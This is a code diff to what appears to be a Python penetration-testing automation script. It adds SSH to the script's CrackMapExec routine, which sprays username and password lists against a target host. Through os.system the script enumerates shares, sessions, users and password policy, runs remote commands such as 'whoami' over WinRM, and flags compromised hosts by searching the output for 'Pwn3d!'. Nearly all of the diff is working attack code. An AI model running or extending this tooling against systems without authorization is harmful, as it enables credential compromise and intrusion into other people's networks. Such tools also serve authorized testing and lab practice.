@@ -484,6 +484,7 @@ def CRACKMAPEXEC():
 			c = "crackmapexec smb"
 			w = "crackmapexec winrm"
 			l = "crackmapexec ldap"
+			s = "crackmapexec ssh"
 			path = "crack.txt"
 			os.system(f"{c} {RHOST} -u keruser.txt -p johnpass.txt --shares --sessions --loggedon-users --users --pass-pol > {path}")
 			os.system(f"{c} {RHOST} -u keruser.txt -p johnpass.txt > crack_smb.txt")
@@ -508,15 +509,26 @@ def CRACKMAPEXEC():
 				word = "Pwn3d!"
 				if word in content:
 					print(f"\n{RED}***Pwn3d! system with {YELLOW}{w}{RED}***{RESET}")
-					time.sleep(3)
+					time.sleep(2)
+			os.system(f"{s} {RHOST} -u keruser.txt -p johnpass.txt --shares --sessions --loggedon-users --users --pass-pol > {path}")
+			os.system(f"{s} {RHOST} -u keruser.txt -p johnpass.txt > crack_ssh.txt")
+			with open (f"crack_ssh.txt", "r") as f:
+				content = f.read()
+				word = "Pwn3d!"
+				if word in content:
+					print(f"\n{RED}***Pwn3d! system with {YELLOW}{s}{RED}***{RESET}")
+					time.sleep(2)
+			
 	if USERNAME is not None and PASSWORD is not None:
 		c = "crackmapexec smb"
 		w = "crackmapexec winrm"
 		l = "crackmapexec ldap"
+		s = "crackmapexec ssh"
 		path = "crack.txt"
 		os.system(f"{c} {RHOST} -u {USERNAME} -p {PASSWORD} --shares --groups --sessions --loggedon-users --users --pass-pol > {path}")
 		os.system(f"{l} {RHOST} -u {USERNAME} -p {PASSWORD} --admin-count --trusted-for-delegation --password-not-required --users --groups >> {path}")
 		os.system(f"{w} {RHOST} -u {USERNAME} -p {PASSWORD} -X whoami >> {path}")
+		os.system(f"{s} {RHOST} -u {USERNAME} -p {PASSWORD} >> {path}")
 		with open (f"crack.txt", "r") as f:
 			content = f.read()
 			print(content)
